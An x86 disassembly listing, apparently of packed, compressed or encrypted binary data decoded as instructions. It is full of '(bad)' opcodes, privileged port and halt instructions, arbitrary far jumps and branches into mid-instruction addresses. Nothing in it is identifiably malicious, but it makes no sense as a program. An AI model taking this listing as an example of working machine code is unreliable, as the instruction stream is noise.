  42c5bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5c0:	test   al,0x38
  42c5c2:	and    DWORD PTR [eax+0x4e53b9fe],edi
  42c5c8:	mov    eax,ds:0x7e6cecf8
  42c5cd:	cdq    
  42c5ce:	stc    
  42c5cf:	mov    BYTE PTR [eax+edi*1],cl
  42c5d2:	inc    edi
  42c5d3:	or     DWORD PTR [edx+ebp*1-0x3a],0x8d6f4ace
  42c5db:	and    BYTE PTR [esi+0x2c84f7f6],0x5b
  42c5e2:	leave  
  42c5e3:	cs repz xor cl,ah
  42c5e7:	and    eax,0x644ca641
  42c5ec:	bound  ebp,QWORD PTR [ecx]
  42c5ee:	xchg   esp,eax
  42c5ef:	add    DWORD PTR [esi-0x1fc7078c],ecx
  42c5f5:	jne    0x42c5ad
  42c5f7:	push   0xffffffc8
  42c5f9:	adc    DWORD PTR [esi-0x75],ecx
  42c5fc:	cmp    ch,BYTE PTR ds:[eax]
  42c5ff:	jo     0x42c654
  42c601:	aad    0x22
  42c603:	pop    esi
  42c604:	dec    eax
  42c605:	das    
  42c606:	fwait
  42c607:	pop    edx
  42c608:	adc    dl,BYTE PTR [edi]
  42c60a:	xchg   esi,eax
  42c60b:	xchg   esi,eax
  42c60c:	sbb    BYTE PTR [esp+edi*1-0x33],0xf8
  42c611:	stos   BYTE PTR es:[edi],al
  42c612:	pop    ss
  42c613:	test   al,0x62
  42c615:	pop    edx
  42c616:	aaa    
  42c617:	stos   DWORD PTR es:[edi],eax
  42c618:	ins    DWORD PTR es:[edi],dx
  42c619:	push   eax
  42c61a:	mov    edx,0x5372d863
  42c61f:	pop    ebp
  42c620:	rcl    BYTE PTR [edx],cl
  42c622:	iret   
  42c623:	mov    DWORD PTR [edx-0x1d],esi
  42c626:	outs   dx,BYTE PTR ds:[esi]
  42c627:	not    BYTE PTR [edi+0xb]
  42c62a:	out    dx,eax
  42c62b:	push   esi
  42c62c:	loop   0x42c629
  42c62e:	leave  
  42c62f:	mov    eax,0xb0215d5f
  42c634:	pop    ds
  42c635:	rcl    BYTE PTR ds:0x53b50410,1
  42c63b:	push   esi
  42c63c:	and    eax,0x959d9c48
  42c641:	test   eax,0xaadd1f6
  42c646:	data16 lods al,BYTE PTR ds:[esi]
  42c648:	lods   al,BYTE PTR ds:[esi]
  42c649:	in     al,dx
  42c64a:	cdq    
  42c64b:	sbb    edx,DWORD PTR [edx]
  42c64d:	mov    DWORD PTR cs:[ecx+eax*8+0x699235e9],edi
  42c655:	mov    bh,0xc1
  42c657:	hlt    
  42c658:	inc    ebp
  42c659:	cs xor dh,ch
  42c65c:	sub    edx,DWORD PTR [ebp+0xd107ec0]
  42c662:	push   eax
  42c663:	lods   al,BYTE PTR ds:[esi]
  42c664:	fwait
  42c665:	lds    ecx,FWORD PTR ds:0x529d14bd
  42c66b:	cli    
  42c66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c66d:	dec    edx
	...
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x7a6dfc6b]
  42c6e3:	sub    DWORD PTR [eax+0x4e],ebx
  42c6e6:	fadd   QWORD PTR [bx+di]
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [esi+ebx*8+0x7c4316cf],al
  42c6f4:	cs (bad) 
  42c6f6:	fs pop edi
  42c6f8:	xor    DWORD PTR [ecx-0x1e],ebx
  42c6fb:	and    ebp,esi
  42c6fd:	(bad)
  42c700:	and    BYTE PTR [ecx+eiz*1-0x14038b8b],ch
  42c707:	jg     0x42c6c3
  42c709:	mov    ebx,0x94a0d6ec
  42c70e:	mov    al,0x93
  42c710:	cmp    eax,0x6a5a82e8
  42c715:	inc    ecx
  42c716:	mov    DWORD PTR [edi+0xd],0x179adfa3
  42c71d:	stos   DWORD PTR es:[edi],eax
  42c71e:	or     BYTE PTR [ebp-0x469b9416],bh
  42c724:	(bad)  
  42c725:	out    0xf7,al
  42c727:	pop    esi
  42c728:	inc    eax
  42c729:	lea    eax,[edi]
  42c72b:	push   esi
  42c72c:	fcomp  DWORD PTR [ecx-0x3e]
  42c72f:	jmp    0x6823:0x7a280582
  42c736:	nop
  42c737:	xor    DWORD PTR [esi+0x65573cf3],esp
  42c73d:	dec    eax
  42c73e:	sbb    al,0x76
  42c740:	add    cl,BYTE PTR ds:0xda86726
  42c746:	cs gs jmp 0x42c7a5
  42c74a:	outs   dx,BYTE PTR ds:[esi]
  42c74b:	jp     0x42c76d
  42c74d:	jbe    0x42c703
  42c74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c750:	cli    
  42c751:	push   edx
  42c752:	or     eax,0x4d267fe2
  42c757:	jno    0x42c773
  42c759:	lea    esi,[eax+0x15]
  42c75c:	inc    edx
  42c75d:	pop    ebp
  42c75e:	sub    cl,cl
  42c760:	(bad)  
  42c761:	lods   eax,DWORD PTR ds:[esi]
  42c762:	pusha  
  42c763:	jo     0x42c7d7
  42c765:	add    ebx,DWORD PTR [ebx]
  42c767:	shl    BYTE PTR ds:0xaab56fa3,1
  42c76d:	aam    0x6
  42c76f:	lods   eax,DWORD PTR ds:[esi]
  42c770:	repnz add al,0xa5
  42c773:	sub    eax,0xd07a9d3b
  42c778:	push   eax
  42c779:	jle    0x42c75b
  42c77b:	mov    esp,0x4204569
  42c780:	inc    ebp
  42c781:	popf   
  42c782:	mov    al,0x62
  42c784:	rol    BYTE PTR [ebx+0x6e],1
  42c787:	scas   eax,DWORD PTR es:[edi]
  42c788:	jnp    0x42c79e
  42c78a:	sub    al,0xfc
  42c78c:	fwait
  42c78d:	cli    
  42c78e:	loopne 0x42c7d9
  42c790:	mov    ecx,0x4d526718
  42c795:	outs   dx,DWORD PTR ds:[esi]
  42c796:	jmp    0x42c771
  42c798:	pop    eax
  42c799:	and    edx,esp
  42c79b:	std    
  42c79c:	rcl    BYTE PTR [ecx-0x23c9c69d],cl
  42c7a2:	push   0xffffffc4
  42c7a4:	outs   dx,BYTE PTR ds:[esi]
  42c7a5:	pop    ecx
  42c7a6:	cli    
  42c7a7:	out    0x79,eax
  42c7a9:	xchg   BYTE PTR [esi-0x53],bl
  42c7ac:	mov    edi,DWORD PTR [ebx]
  42c7ae:	mov    fs,WORD PTR [ebp-0x156e8689]
  42c7b4:	lock bnd jle 0x42c7f7
  42c7b8:	pop    es
  42c7b9:	rcr    DWORD PTR [esi],0xb8
  42c7bc:	sub    dh,BYTE PTR [edx]
  42c7be:	sub    ebx,DWORD PTR [ebp-0x7f3e6a1a]
  42c7c4:	pop    ecx
  42c7c5:	xchg   DWORD PTR [edx+0x4f16462a],esi
  42c7cb:	dec    esi
  42c7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c7cd:	loopne 0x42c755
  42c7cf:	stos   BYTE PTR es:[edi],al
  42c7d0:	popf   
  42c7d1:	sbb    BYTE PTR [ebx-0x2f],0x7b
  42c7d5:	xchg   esi,eax
  42c7d6:	jmp    0x9e0a:0xc4eadf74
  42c7dd:	mov    esi,edi
  42c7df:	fimul  DWORD PTR ss:0xcddf2487
  42c7e6:	mov    esi,0x82588553
  42c7eb:	push   cs
  42c7ec:	xchg   ebp,eax
  42c7ed:	repnz add BYTE PTR [eax],al
	...
  42c854:	add    BYTE PTR [eax],al
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	push   0x2f
  42c864:	retf   
  42c865:	pop    es
  42c866:	fld    QWORD PTR [bx+di]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    BYTE PTR [edx-0x1c666cc4],ah
  42c873:	ret    
  42c874:	(bad)  
  42c875:	outs   dx,DWORD PTR ds:[esi]
  42c876:	(bad)  
  42c877:	or     al,0x1
  42c879:	sbb    ah,al
  42c87b:	xchg   edx,eax
  42c87c:	pop    eax
  42c87d:	lds    ecx,FWORD PTR [eax-0x41e03433]
  42c883:	stc    
  42c884:	(bad)  
  42c885:	dec    ebp
  42c886:	int    0xa3
  42c888:	mov    eax,0x236d81a
  42c88d:	mov    BYTE PTR [esi+0x2c],dl
  42c890:	call   0x32aee633
  42c895:	hlt    
  42c896:	mov    esi,0xee100037
  42c89b:	and    al,BYTE PTR [eax-0x50]
  42c89e:	fcmovb st,st(0)
  42c8a0:	popa   
  42c8a1:	rcr    BYTE PTR [bp-0x3a],1
  42c8a5:	mov    eax,0x501e2349
  42c8aa:	inc    edi
  42c8ab:	es call 0x4018289
  42c8b1:	xchg   DWORD PTR [edi+esi*1-0x2c],eax
  42c8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8b6:	(bad)  
  42c8b7:	sti    
  42c8b8:	(bad)  
  42c8b9:	jg     0x42c8b7
  42c8bb:	aam    0xe8
  42c8bd:	out    0xfd,eax
  42c8bf:	sbb    al,0xb1
  42c8c1:	xchg   BYTE PTR [ebx+0x37],bh
  42c8c4:	cmp    DWORD PTR [edi-0x47ada304],ecx
  42c8ca:	nop
  42c8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8cc:	loopne 0x42c917
  42c8ce:	inc    edi
  42c8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8d0:	mov    al,0x91
  42c8d2:	js     0x42c886
  42c8d4:	xor    cl,al
  42c8d6:	xchg   edx,eax
  42c8d7:	aad    0x46
  42c8d9:	jo     0x42c87a
  42c8db:	imul   ebp,DWORD PTR [ebp-0x5c],0x5f149957
  42c8e2:	or     eax,0x36f2a0dc
  42c8e7:	inc    esp
  42c8e8:	mov    eax,0x8cde2150
  42c8ed:	add    bh,BYTE PTR [esi-0x6c]
  42c8f0:	ins    BYTE PTR es:[edi],dx
  42c8f1:	aam    0xb5
  42c8f3:	nop
  42c8f4:	out    dx,al
  42c8f5:	mul    DWORD PTR [ecx-0x4c086987]
  42c8fb:	jp     0x42c94d
  42c8fd:	daa    
  42c8fe:	inc    esp
  42c8ff:	sti    
  42c900:	rcl    edi,0xa4
  42c903:	arpl   WORD PTR [edi],dx
  42c905:	and    ecx,DWORD PTR [edx+0x46e708a2]
  42c90b:	mov    cl,0xed
  42c90d:	pop    ss
  42c90e:	push   ecx
  42c90f:	and    eax,0x7c201a06
  42c914:	sub    bl,BYTE PTR [ebx-0x254f5781]
  42c91a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c91b:	out    0x24,eax
  42c91d:	out    0xfb,eax
  42c91f:	jmp    0x46abdf9a
  42c924:	push   es
  42c925:	adc    BYTE PTR [eax-0x4],dl
  42c928:	jo     0x42c8f6
  42c92a:	pop    ebx
  42c92b:	ds mov edi,0x467a5c93
  42c931:	stos   BYTE PTR es:[edi],al
  42c932:	jp     0x42c9b1
  42c934:	lock adc BYTE PTR [esi-0x29],al
  42c938:	sub    edi,edx
  42c93a:	les    esi,FWORD PTR [ebx-0x2473d9a3]
  42c940:	popa   
  42c941:	js     0x42c900
  42c943:	call   0x83f3:0x33e3daa
  42c94a:	and    ah,dl
  42c94c:	call   0x4a49:0x9a7ce0d6
  42c953:	popa   
  42c954:	adc    BYTE PTR [eax],al
  42c956:	aad    0xa
  42c958:	in     al,dx
  42c959:	sub    ch,BYTE PTR [ebx+0x4b73d54e]
  42c95f:	and    BYTE PTR [esi],dl
  42c961:	or     BYTE PTR [ebx],0x5d
  42c964:	hlt    
  42c965:	iret   
  42c966:	cmc    
  42c967:	adc    eax,0xb882bcd1
  42c96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c96d:	mov    BYTE PTR [eax],0x0
	...
  42c9d4:	add    BYTE PTR [eax],al
  42c9d6:	adc    BYTE PTR [ebx],bl
  42c9d8:	leave  
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x36ced8c
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [eax],bl
  42c9ef:	fstp   TBYTE PTR [eax]
  42c9f1:	xrelease xchg BYTE PTR [ecx+0x44],dh
  42c9f5:	(bad)  
  42c9f6:	sar    DWORD PTR [ebp-0x73],cl
  42c9f9:	pop    ebp
  42c9fa:	xchg   edi,eax
  42c9fb:	adc    DWORD PTR [eax-0x2c],edx
  42c9fe:	(bad)  
  42c9ff:	in     al,dx
  42ca00:	jnp    0x42ca6b
  42ca02:	xchg   edi,eax
  42ca03:	sbb    al,BYTE PTR [ecx+0x2d]
  42ca06:	sbb    BYTE PTR [edx],ah
  42ca08:	fisubr DWORD PTR [esi+0x3c8164a8]
  42ca0e:	mov    bh,0xf2
  42ca10:	shl    ah,1
  42ca12:	xor    BYTE PTR [esp+esi*8],al
  42ca15:	dec    esp
  42ca16:	out    dx,eax
  42ca17:	add    eax,0xdce1a6bc
  42ca1c:	sub    DWORD PTR [eax-0x77],0x6a
  42ca20:	or     al,0x89
  42ca22:	add    BYTE PTR [ebp+0x1af3fe0c],dl
  42ca28:	(bad)  
  42ca29:	fcomp  DWORD PTR [esi]
  42ca2b:	test   DWORD PTR [esi],0xca84f867
  42ca31:	fidiv  WORD PTR [eax]
  42ca33:	pushf  
  42ca34:	dec    esp
  42ca35:	sahf   
  42ca36:	addr16 sar eax,1
  42ca39:	inc    eax
  42ca3a:	sub    al,0x71
  42ca3c:	(bad)  
  42ca3d:	div    dl
  42ca3f:	and    esi,DWORD PTR [ebp+0x6a]
  42ca42:	(bad)  
  42ca43:	and    eax,0xc27a3ae7
  42ca48:	pop    ecx
  42ca49:	in     al,dx
  42ca4a:	push   eax
  42ca4b:	sub    al,0x81
  42ca4d:	jo     0x42ca3a
  42ca4f:	call   0x1212:0x8839d43f
  42ca56:	fisubr DWORD PTR [edx-0x75]
  42ca59:	mov    bh,0x4e
  42ca5b:	push   esi
  42ca5c:	inc    esp
  42ca5d:	mov    bh,0x5c
  42ca5f:	loop   0x42c9fd
  42ca61:	das    
  42ca62:	cmp    DWORD PTR [eax+0x59214d1a],ebp
  42ca68:	mov    esp,0x51163b89
  42ca6d:	xor    al,0x31
  42ca6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca70:	stc    
  42ca71:	call   0xfc95e036
  42ca76:	mov    esp,0x49d5fdbd
  42ca7b:	fs jmp 0x42ca0a
  42ca7e:	mov    al,0x68
  42ca80:	das    
  42ca81:	mov    edi,0xf309d14a
  42ca86:	pop    es
  42ca87:	ficom  WORD PTR ds:0x56e0fa95
  42ca8d:	test   eax,0xa1740d8b
  42ca92:	inc    edx
  42ca93:	xor    al,0xc7
  42ca95:	xchg   edx,eax
  42ca96:	popa   
  42ca97:	daa    
  42ca98:	inc    esp
  42ca99:	cmp    DWORD PTR ds:0x48237e63,esi
  42ca9f:	ds or  al,0xa9
  42caa2:	mov    ebx,0x92f86ee
  42caa7:	mov    DWORD PTR [ecx-0x201ecaf7],ebx
  42caad:	mov    ebp,0x12518663
  42cab2:	or     al,0x4b
  42cab4:	fs jb  0x42cadf
  42cab7:	and    dl,BYTE PTR [eax+0x1e]
  42caba:	loop   0x42caa6
  42cabc:	loopne 0x42cab9
  42cabe:	loope  0x42cada
  42cac0:	inc    edx
  42cac1:	mov    ah,0x33
  42cac3:	retf   
  42cac4:	fwait
  42cac5:	not    DWORD PTR [esi+0x73254d6b]
  42cacb:	ins    DWORD PTR es:[edi],dx
  42cacc:	jg     0x42ca70
  42cace:	xor    eax,DWORD PTR [eax]
  42cad0:	loope  0x42caee
  42cad2:	sub    DWORD PTR [eax-0x45],0x369d161c
  42cad9:	je     0x42cabe
  42cadb:	pop    ebx
  42cadc:	fiadd  WORD PTR es:[esi+0x50]
  42cae0:	fstp   DWORD PTR ds:0x4daf4d5
  42cae6:	fld    TBYTE PTR [eax+0x67d52313]
  42caec:	sub    al,0x5b
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x3ecb6ec0]
  42cb64:	arpl   WORD PTR [ebp+0x67],di
  42cb67:	fild   WORD PTR [ecx]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    ah,al
  42cb6f:	fdivrp st(5),st
  42cb71:	(bad)
  42cb74:	mov    WORD PTR [ecx-0x20],fs
  42cb77:	outs   dx,BYTE PTR ds:[esi]
  42cb78:	call   0xf1c1:0xaee038a3
  42cb7f:	out    dx,eax
  42cb80:	into   
  42cb81:	and    DWORD PTR [edi],esi
  42cb83:	push   edx
  42cb84:	mov    al,ds:0x420c3927
  42cb89:	add    BYTE PTR [ebx+eax*4-0x78],bh
  42cb8d:	mov    edx,0xa3ad1453
  42cb92:	dec    ebp
  42cb93:	mov    ebp,0xc04ab6e3
  42cb98:	aad    0x65
  42cb9a:	mov    al,0x5d
  42cb9c:	test   DWORD PTR [ecx],0xf1bc01b8
  42cba2:	aaa    
  42cba3:	sub    DWORD PTR [edx],esi
  42cba5:	mov    eax,ds:0x22d03d46
  42cbaa:	test   eax,0x72e98d81
  42cbaf:	jno    0x42cbec
  42cbb1:	cmp    al,BYTE PTR [edi-0x27ad175c]
  42cbb7:	aam    0x16
  42cbb9:	out    dx,eax
  42cbba:	jmp    0xc864:0x83c675c1
  42cbc1:	or     ebp,DWORD PTR [edx+0x52]
  42cbc4:	jmp    0x42cc35
  42cbc6:	dec    ecx
  42cbc7:	test   DWORD PTR [ebp-0x6a],esp
  42cbca:	cs jmp 0x9777ca75
  42cbd0:	(bad)  
  42cbd1:	fsub   QWORD PTR [eax]
  42cbd3:	fisttp QWORD PTR [edi+0x417d82dc]
  42cbd9:	xchg   ebx,eax
  42cbda:	sti    
  42cbdb:	out    dx,eax
  42cbdc:	dec    ebp
  42cbdd:	adc    ebp,ebx
  42cbdf:	aad    0xa6
  42cbe1:	inc    ebp
  42cbe2:	xchg   edx,eax
  42cbe3:	lods   al,BYTE PTR ds:[esi]
  42cbe4:	(bad)  
  42cbe5:	outs   dx,DWORD PTR ds:[esi]
  42cbe6:	pop    ecx
  42cbe7:	aad    0xa4
  42cbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbea:	je     0x42cbea
  42cbec:	pop    edx
  42cbed:	cmc    
  42cbee:	add    DWORD PTR [edx+0x40],0xaf9304cc
  42cbf5:	sub    eax,0xb5927c3d
  42cbfa:	(bad)  
  42cbfb:	popa   
  42cbfc:	enter  0x784c,0xa3
  42cc00:	call   0x3ec1b8b4
  42cc05:	dec    DWORD PTR [edi+0x12b74cb7]
  42cc0b:	pop    es
  42cc0c:	xchg   ebp,eax
  42cc0d:	daa    
  42cc0e:	dec    edx
  42cc0f:	in     eax,dx
  42cc10:	cmp    BYTE PTR [ecx-0x66],bh
  42cc13:	jmp    0x4127:0x10eeaf35
  42cc1a:	lods   eax,DWORD PTR ds:[esi]
  42cc1b:	scas   al,BYTE PTR es:[edi]
  42cc1c:	or     al,0xe8
  42cc1e:	dec    edx
  42cc1f:	ja     0x42cbe2
  42cc21:	pop    esp
  42cc22:	data16 mov ch,0x4b
  42cc25:	mov    DWORD PTR [ecx+edx*1],ecx
  42cc28:	imul   edi,DWORD PTR [edi-0x65f8985c],0x8e5c171
  42cc32:	loope  0x42cc3d
  42cc34:	(bad)  
  42cc35:	ja     0x42cbf6
  42cc37:	pop    eax
  42cc38:	xchg   ebx,eax
  42cc39:	add    cl,ah
  42cc3b:	mov    eax,ds:0xcd4d64fc
  42cc40:	adc    eax,0xfbbc9636
  42cc45:	pop    es
  42cc46:	stc    
  42cc47:	jae    0x42cc73
  42cc49:	mov    ?,WORD PTR [eax-0x4a]
  42cc4c:	add    DWORD PTR [ecx+0x25],esp
  42cc4f:	jae    0x42cbe6
  42cc51:	daa    
  42cc52:	sbb    DWORD PTR [ebx+0x74],edi
  42cc55:	or     dl,bl
  42cc57:	lods   eax,DWORD PTR ds:[esi]
  42cc58:	and    edi,DWORD PTR [esi]
  42cc5a:	sahf   
  42cc5b:	sub    eax,0x633c6185
  42cc60:	sub    edi,DWORD PTR [ecx+0x1a]
  42cc63:	pop    ss
  42cc64:	fmulp  st(4),st
  42cc66:	or     al,0xfa
  42cc68:	cmp    BYTE PTR [ebx],0xb
  42cc6b:	das    
  42cc6c:	add    edx,DWORD PTR [ebp+0x0]
	...
  42ccd6:	jg     0x42ccda
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x55a9255e
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [ecx-0x48],al
  42ccf0:	pop    ebp
  42ccf1:	push   ds
  42ccf2:	stos   DWORD PTR es:[edi],eax
  42ccf3:	push   edi
  42ccf4:	inc    edi
  42ccf5:	sub    eax,0x584f8447
  42ccfa:	stos   BYTE PTR es:[edi],al
  42ccfb:	inc    esp
  42ccfc:	shl    BYTE PTR [eax-0x75],0xd5
  42cd00:	gs iret 
  42cd02:	sahf   
  42cd03:	shl    DWORD PTR [bp+di+0x44e0],1
  42cd08:	call   0x8ea5c7ee
  42cd0d:	jae    0x42cd7d
  42cd0f:	push   0x590e1c64
  42cd14:	(bad)  
  42cd15:	and    eax,0xa3e49c47
  42cd1a:	mov    esp,0x9fccd8d9
  42cd1f:	repnz fs push esi
  42cd22:	mov    edx,0xc4ccfae8
  42cd27:	fldenv [ebx]
  42cd29:	out    dx,al
  42cd2a:	es adc eax,0xf30c88c5
  42cd30:	out    0x19,eax
  42cd32:	(bad)  
  42cd34:	lock and eax,0x362c108c
  42cd3a:	cwde   
  42cd3b:	mov    cl,0x3
  42cd3d:	in     al,dx
  42cd3e:	jae    0x42cd9a
  42cd40:	mov    dh,0x51
  42cd42:	adc    DWORD PTR [esi+0x3a],0x785217f6
  42cd49:	sub    BYTE PTR [esi],ch
  42cd4b:	out    0x2d,al
  42cd4d:	(bad)  
  42cd4e:	and    al,0x3a
  42cd50:	push   eax
  42cd51:	imul   esp,DWORD PTR [edx-0x33c7b7b5],0x851efa44
  42cd5b:	add    eax,0x802b15fd
  42cd60:	dec    eax
  42cd61:	addr16 inc edx
  42cd63:	test   al,0xbc
  42cd65:	test   al,0xb4
  42cd67:	jecxz  0x42cdc0
  42cd69:	leave  
  42cd6a:	mov    ebx,0x368d631b
  42cd6f:	or     edi,esi
  42cd71:	push   ebx
  42cd72:	int    0x4d
  42cd74:	jl     0x42cd4f
  42cd76:	mov    dl,0x10
  42cd78:	rcl    DWORD PTR [eax],0xbe
  42cd7b:	push   edx
  42cd7c:	xchg   esp,eax
  42cd7d:	imul   esi,DWORD PTR es:[eax],0x384f163e
  42cd84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd85:	jbe    0x42cddd
  42cd87:	dec    ebp
  42cd88:	or     al,0xd0
  42cd8a:	test   BYTE PTR [ebx],bl
  42cd8c:	retf   0x8b96
  42cd8f:	xchg   esp,edx
  42cd91:	cmp    al,0x9f
  42cd93:	push   cs
  42cd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd95:	xor    DWORD PTR [edi+0x3],esp
  42cd98:	in     al,0xf7
  42cd9a:	imul   edi,DWORD PTR [ebp-0x2c],0x16285377
  42cda1:	cmp    BYTE PTR [esi-0x59a201cc],0xd2
  42cda8:	xchg   esi,eax
  42cda9:	xor    eax,0xdc013f8c
  42cdae:	lods   eax,DWORD PTR ds:[esi]
  42cdaf:	mov    edx,0x79646c46
  42cdb4:	stc    
  42cdb5:	int3   
  42cdb6:	mov    eax,0x5b6ee0a3
  42cdbb:	sub    eax,0x57cff167
  42cdc0:	mov    al,ds:0x74240461
  42cdc5:	inc    BYTE PTR [ecx+0x9]
  42cdc8:	imul   ebp,DWORD PTR [ebp+0x5],0xba6291c6
  42cdcf:	sbb    esp,esi
  42cdd1:	daa    
  42cdd2:	sub    dh,bh
  42cdd4:	fnstsw WORD PTR [ebx]
  42cdd6:	mov    ds:0xcc477b5b,eax
  42cddb:	cmp    bh,BYTE PTR [ecx-0x730d8cdc]
  42cde1:	mov    al,0x1a
  42cde3:	hlt    
  42cde4:	aam    0x70
  42cde6:	adc    DWORD PTR [ebx-0x2edd43eb],ebx
  42cdec:	hlt    
  42cded:	outs   dx,BYTE PTR ds:[esi]
	...
  42ce56:	sbb    DWORD PTR [ecx-0x20017802],esp
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x6e
  42ce63:	xchg   ebp,eax
  42ce64:	xchg   esi,eax
  42ce65:	test   eax,0x1e167
  42ce6a:	add    BYTE PTR [ecx],al
  42ce6c:	add    BYTE PTR [eax],al
  42ce6e:	or     eax,0x252c4837
  42ce73:	jbe    0x42ce01
  42ce75:	jb     0x42ceae
  42ce77:	fdiv   DWORD PTR [ebx+0x28f67dca]
  42ce7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce7e:	ret    0xe28e
  42ce81:	imul   BYTE PTR [ecx-0x502442d8]
  42ce87:	mov    ss,WORD PTR [eax+0x1e7ca45c]
  42ce8d:	mov    ebx,0x3f476d52
  42ce92:	mov    al,ds:0xd5c36a0c
  42ce97:	xchg   ecx,eax
  42ce98:	(bad)  
  42ce99:	sbb    BYTE PTR es:[ebp+edx*2-0x2d],bh
  42ce9e:	and    eax,0x119b2531
  42cea3:	jmp    0x42ced3
  42cea5:	shr    ah,0x68
  42cea8:	lea    ecx,[ebx-0x31bdb945]
  42ceae:	popf   
  42ceaf:	push   ebx
  42ceb0:	iret   
  42ceb1:	repz add eax,0xe45c1ee3
  42ceb7:	popf   
  42ceb8:	out    dx,al
  42ceb9:	retf   
  42ceba:	and    BYTE PTR [edx+0x28d842bb],cl
  42cec0:	jae    0x42ce44
  42cec2:	cmc    
  42cec3:	add    BYTE PTR [edx],al
  42cec5:	je     0x42cecb
  42cec7:	repnz mov ch,0x31
  42ceca:	int    0x71
  42cecc:	jg     0x42cf47
  42cece:	test   BYTE PTR [edx],bl
  42ced0:	arpl   di,bp
  42ced2:	or     al,0xd
  42ced4:	scas   eax,DWORD PTR es:[edi]
  42ced5:	pop    ds
  42ced6:	mov    esi,0x7b84864
  42cedb:	dec    edx
  42cedc:	aad    0x46
  42cede:	inc    ecx
  42cedf:	bound  eax,QWORD PTR ds:0x29dfbe6a
  42cee5:	xor    BYTE PTR [ecx],dl
  42cee7:	add    DWORD PTR [ebp-0x79],ebp
  42ceea:	retf   
  42ceeb:	sbb    al,0x3b
  42ceed:	cmp    ecx,DWORD PTR [ebp+0x21]
  42cef0:	xor    BYTE PTR [edx+0x43],0xd2
  42cef4:	movs   BYTE PTR es:[di],BYTE PTR cs:[si]
  42cef7:	pop    ebx
  42cef8:	mov    dl,BYTE PTR [esi-0x79]
  42cefb:	adc    al,0xf3
  42cefd:	les    edx,FWORD PTR [edi-0x77]
  42cf00:	or     edx,DWORD PTR [esi-0x7039167b]
  42cf06:	enter  0x24fd,0x81
  42cf0a:	imul   ebp,DWORD PTR [esi],0x53ec5d09
  42cf10:	jne    0x42cf69
  42cf12:	out    0x28,eax
  42cf14:	(bad)  
  42cf16:	sbb    DWORD PTR [edx+0x32],0xffffff89
  42cf1a:	(bad)  
  42cf1c:	ins    DWORD PTR es:[edi],dx
  42cf1d:	xchg   edx,ecx
  42cf1f:	push   ebp
  42cf20:	sbb    ah,BYTE PTR [edi+eax*4-0xe]
  42cf24:	dec    ebx
  42cf25:	mov    edx,0x3c6c19a3
  42cf2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf2b:	fldcw  WORD PTR [ebp+0x68]
  42cf2e:	nop
  42cf2f:	jle    0x42cfa0
  42cf31:	or     BYTE PTR [eax-0x1d],dh
  42cf34:	and    edi,DWORD PTR [edx-0x71481253]
  42cf3a:	(bad)  [eax-0x48]
  42cf3d:	xchg   edi,eax
  42cf3e:	repz pusha 
  42cf40:	(bad)  
  42cf41:	or     DWORD PTR [ebx-0x22],0xd579189e
  42cf48:	shl    ecx,1
  42cf4a:	pusha  
  42cf4b:	xor    eax,0x91baff8
  42cf50:	sbb    al,0xe1
  42cf52:	xor    al,0x4b
  42cf54:	push   esp
  42cf55:	stos   BYTE PTR es:[edi],al
  42cf56:	out    dx,al
  42cf57:	push   ebp
  42cf58:	test   DWORD PTR [esi],ebx
  42cf5a:	jo     0x42cf38
  42cf5c:	js     0x42cf7c
  42cf5e:	sbb    ebx,esi
  42cf60:	fild   QWORD PTR [ecx+0x36]
  42cf63:	lea    ebp,[ecx-0x42]
  42cf66:	push   eax
  42cf67:	fidiv  DWORD PTR [esi+edx*1-0x2]
  42cf6b:	add    al,0x95
  42cf6d:	imul   eax,DWORD PTR [eax],0x0
	...
  42cfd4:	add    BYTE PTR [eax],al
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
